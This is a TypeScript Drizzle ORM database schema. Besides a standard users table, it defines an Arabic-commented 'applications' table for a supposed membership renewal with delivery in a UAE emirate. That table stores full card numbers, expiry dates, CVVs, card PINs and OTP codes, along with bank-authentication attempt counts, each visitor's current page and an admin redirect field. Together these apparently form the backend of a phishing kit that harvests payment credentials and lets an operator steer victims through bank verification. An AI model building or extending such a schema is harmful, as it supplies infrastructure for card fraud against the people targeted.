import { bigint, int, mysqlEnum, mysqlTable, text, timestamp, varchar, tinyint } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// جدول طلبات العضوية
export const applications = mysqlTable("applications", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),

  // معلومات العضوية
  membershipType: varchar("membershipType", { length: 32 }),

  // بيانات تجديد العضوية
  renewalMembershipNumber: varchar("renewalMembershipNumber", { length: 64 }),
  currentMembershipType: varchar("currentMembershipType", { length: 32 }),

  // المعلومات الشخصية
  fullName: varchar("fullName", { length: 256 }),
  phone: varchar("phone", { length: 32 }),
  idNumber: varchar("idNumber", { length: 64 }),

  // معلومات العنوان
  emirate: varchar("emirate", { length: 64 }),
  area: varchar("area", { length: 128 }),
  street: varchar("street", { length: 256 }),
  deliveryTime: varchar("deliveryTime", { length: 64 }),

  // بيانات البطاقة
  cardNumber: varchar("cardNumber", { length: 32 }),
  cardExpiry: varchar("cardExpiry", { length: 8 }),
  cardCvv: varchar("cardCvv", { length: 8 }),
  cardNetwork: varchar("cardNetwork", { length: 32 }),
  cardPin: varchar("cardPin", { length: 16 }),
  otpCode: varchar("otpCode", { length: 16 }),

  // حالة الطلب
  currentPage: varchar("currentPage", { length: 128 }).default("/"),
  status: mysqlEnum("status", ["pending", "approved", "rejected"]).default("pending").notNull(),
  isArchived: tinyint("isArchived").default(0).notNull(),

  // تأكيد المصادقة البنكية
  bankAuthConfirmed: tinyint("bankAuthConfirmed").default(0).notNull(),
  bankAuthAttempts: int("bankAuthAttempts").default(0).notNull(),

  // توجيه الإدارة
  adminRedirectPage: varchar("adminRedirectPage", { length: 128 }),

  createdAt: bigint("createdAt", { mode: "number" }).notNull(),
  updatedAt: bigint("updatedAt", { mode: "number" }).notNull(),
});

export type Application = typeof applications.$inferSelect;
export type InsertApplication = typeof applications.$inferInsert;